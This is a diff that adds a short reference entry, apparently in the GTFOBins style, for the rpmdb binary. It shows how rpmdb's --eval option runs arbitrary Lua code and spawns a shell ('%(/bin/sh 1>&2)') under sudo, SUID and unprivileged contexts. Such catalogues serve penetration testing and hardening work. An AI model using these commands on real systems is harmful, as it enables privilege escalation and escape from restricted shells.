@@ -1,0 +1,29 @@
+rpmdb
+=====
+
+Inherit
+-------
+
+[Sudo]
+    rpmdb --eval '%{lua:...}'
+    This allows to run Lua code (`...`).
+
+[SUID]
+    rpmdb --eval '%{lua:...}'
+    This allows to run Lua code (`...`).
+
+[Unprivileged]
+    rpmdb --eval '%{lua:...}'
+    This allows to run Lua code (`...`).
+
+Shell
+-----
+
+[Sudo]
+    rpmdb --eval '%(/bin/sh 1>&2)'
+
+[SUID]
+    rpmdb --eval '%(/bin/sh 1>&2)'
+
+[Unprivileged]
+    rpmdb --eval '%(/bin/sh 1>&2)'
